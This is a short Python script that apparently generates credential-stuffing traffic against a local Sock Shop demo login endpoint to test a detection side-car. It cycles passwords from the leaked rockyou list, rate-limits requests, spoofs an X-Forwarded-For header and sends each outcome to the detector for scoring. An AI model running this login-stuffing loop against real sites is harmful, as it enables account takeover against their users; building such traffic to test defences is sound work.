# scripts/stuffing.py

import requests, random, itertools, time, csv

# load your creds list (rockyou or hardcoded)
def load_creds(path, limit=None):
    creds = []
    with open(path, newline="", encoding="latin-1") as f:
        for i, line in enumerate(f):
            pwd = line.strip()
            # Here we generate dummy usernames, or you could have a separate user list
            user = f"user{random.randint(1,10000)}"
            creds.append((user, pwd))
            if limit and i+1 >= limit:
                break
    return creds

creds = load_creds("scripts/data/rockyou.txt", limit=5000)
pool  = itertools.cycle(creds)

def attack(rate_per_sec=10):
    """Hit the store's /login, then your detector's /score."""
    for user, pwd in pool:
        ip = "10.0.0.1"

        # 1️⃣ Send to Sock Shop login
        login_resp = requests.post(
            "http://localhost:8080/login",
            json={"username": user, "password": pwd},
            headers={"X-Forwarded-For": ip},
            timeout=3
        )
        login_ok = (login_resp.status_code == 200)
        print(f"LOGIN {login_resp.status_code} ← {ip}:{user}/{pwd[:3]}…")

        # 2️⃣ Send to your detector side-car
        score_payload = {
            "client_ip":  ip,
            "auth_result": "success" if login_ok else "failure"
        }
        try:
            score_resp = requests.post(
                "http://localhost:8001/score",
                json=score_payload,
                timeout=3
            )
            print(f"SCORE {score_resp.status_code} → {score_resp.json()}")
        except Exception as e:
            print("SCORE ERROR:", e)

        time.sleep(1/rate_per_sec)

if __name__ == "__main__":
    attack(rate_per_sec=5)
